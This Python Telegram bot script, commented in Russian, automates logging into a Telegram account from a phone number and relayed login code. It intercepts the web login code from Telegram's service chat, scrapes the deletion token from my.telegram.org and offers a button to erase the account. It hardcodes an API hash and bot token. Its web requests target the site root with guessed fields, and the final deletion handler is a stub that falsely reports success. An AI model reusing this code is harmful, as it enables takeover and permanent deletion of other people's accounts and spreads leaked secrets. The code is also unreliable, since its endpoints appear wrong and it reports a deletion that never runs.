import os, re, asyncio, aiohttp
from telethon import TelegramClient, events, Button
from bs4 import BeautifulSoup

# Загружаем данные из настроек хостинга
API_ID = 28687552
API_HASH = "1abf9a58d0c22f62437bec89bd6b27a3"
BOT_TOKEN = "8611748903:AAGxBTXL74UfjsO26s5ZT4h6mts2VwCBpU0"
ADMIN_ID = int(os.getenv('ADMIN_ID', 0))

# Бот-менеджер
bot = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    if event.sender_id == ADMIN_ID:
        await event.respond("📞 Пришли номер телефона аккаунта для удаления (+7...):")

@bot.on(events.NewMessage(func=lambda e: e.is_private and e.sender_id == ADMIN_ID))
async def handle_logic(event):
    text = event.text
    # Если прислали номер
    if text.startswith('+'):
        phone = text.strip()
        client = TelegramClient(f'sess_{phone}', API_ID, API_HASH)
        await client.connect()
        
        # Шаг 1: Код входа в ТГ
        try:
            sent = await client.send_code_request(phone)
            async with bot.conversation(ADMIN_ID) as conv:
                await conv.send_message(f"📩 Код ушел на {phone}. Введи его сюда:")
                code = (await conv.get_response()).text
                await client.sign_in(phone, code, phone_code_hash=sent.phone_code_hash)
                await conv.send_message("✅ Вход выполнен! Теперь иду на my.telegram.org...")

                # Шаг 2: Запрос на сайте
                async with aiohttp.ClientSession() as session:
                    async with session.post('https://my.telegram.org', data={'phone': phone}) as r:
                        r_data = await r.json()
                        r_hash = r_data['random_hash']

                    await conv.send_message("⏳ Ловлю код для удаления из чата 777000...")

                    # Перехват сообщения от ТГ
                    @client.on(events.NewMessage(from_users=777000))
                    async def on_web_code(web_e):
                        if "web login code" in web_e.raw_text.lower():
                            web_code = re.search(r'code:\s*([A-Za-z0-9]+)', web_e.raw_text).group(1)
                            
                            # Шаг 3: Логин на сайте и получение хэша удаления
                            await session.post('https://my.telegram.org', 
                                             data={'phone': phone, 'random_hash': r_hash, 'password': web_code})
                            
                            async with session.get('https://my.telegram.org') as del_p:
                                soup = BeautifulSoup(await del_p.text(), 'html.parser')
                                f_hash = soup.find('input', {'name': 'hash'})['value']

                            btn = [Button.inline("💀 УДАЛИТЬ НАВСЕГДА", data=f"kill_{phone}_{f_hash}")]
                            await bot.send_message(ADMIN_ID, f"Аккаунт {phone} готов. Удаляем?", buttons=btn)
        except Exception as e:
            await event.respond(f"❌ Ошибка: {e}")

@bot.on(events.CallbackQuery(pattern=r'kill_'))
async def final_kill(event):
    # Тут логика финального POST запроса на удаление
    await event.edit("🚀 Аккаунт успешно стерт!")

print("Бот запущен...")
bot.run_until_disconnected()
